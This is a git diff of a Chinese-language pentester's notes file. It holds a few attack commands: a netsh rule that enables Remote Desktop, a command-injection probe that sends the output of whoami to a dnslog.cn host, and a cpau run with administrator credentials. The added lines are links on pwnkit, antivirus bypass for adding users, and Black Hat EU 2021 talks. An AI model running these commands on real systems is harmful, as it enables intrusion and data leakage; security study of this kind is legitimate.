@@ -221,9 +221,6 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 比如linux,
 ```
  ping `whoami`.ag1euc.dnslog.cn
-
-
-
 ```
 
 
@@ -348,3 +345,18 @@ cpau -u administrator -p password -ex notepad
 ```
 
 
+**2022-02-14**
+
+- OS漏洞:
+  - pwnkit：polkit 的 pkexec 中的本地权限升级 （CVE-2021-4034）
+  - [一些绕过AV进行UserAdd的方法总结及实现](https://www.anquanke.com/post/id/264890)
+- [blackhat--欧洲2021](https://www.blackhat.com/eu-21/briefings/schedule/)
+  - [录播视频](https://www.youtube.com/playlist?list=PLH15HpR5qRsW62N-GLRb1q56Zr7sm10rF)
+  - [通过恶意 USB 设备实现 Linux 内核代码执行](https://www.blackhat.com/eu-21/briefings/schedule/#achieving-linux-kernel-code-execution-through-a-malicious-usb-device-24776)
+  - [禅与对抗性机器学习的艺术](https://www.blackhat.com/eu-21/briefings/schedule/#zen-and-the-art-of-adversarial-machine-learning-24746)
+  - [Windows Defender - 通过了解 AV 的签名来揭开神秘面纱并绕过 ASR](https://www.blackhat.com/eu-21/briefings/schedule/#windows-defender---demystifying-and-bypassing-asr-by-understanding-the-avs-signatures-24866)
+
+
+**2022-02-15**
+
+[正向shell总结](https://xz.aliyun.com/t/10843)
